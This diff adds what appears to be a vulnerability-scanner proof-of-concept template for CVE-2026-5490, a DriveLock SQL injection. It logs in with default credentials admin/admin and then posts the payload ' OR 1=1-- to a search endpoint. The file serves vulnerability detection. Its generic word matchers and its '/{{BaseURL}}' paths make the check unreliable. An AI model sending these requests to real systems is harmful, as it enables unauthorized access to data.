@@ -1,0 +1,71 @@
+[info]
+author = "ave"
+description = "验证DriveLock SQL注入漏洞：先通过身份认证访问Web服务，提交含恶意SQL的输入，检测是否绕过权限获取受保护资源"
+id = "POC-AVE-2026-1212"
+name = "CVE-2026-5490 PoC"
+severity = "high"
+tags = ["ave-2026-1212"]
+vuln_id = [
+    "CVE-2026-5490",
+    "AVE-2026-1212",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/login"
+protocol = "http"
+
+[poc.requests.body]
+content = "username=admin&password=admin"
+type = "form"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "dashboard",
+    "welcome",
+    "admin",
+]
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/search"
+protocol = "http"
+
+[poc.requests.body]
+content = "query=' OR 1=1--"
+type = "form"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "result",
+    "data",
+    "record",
+    "user",
+]
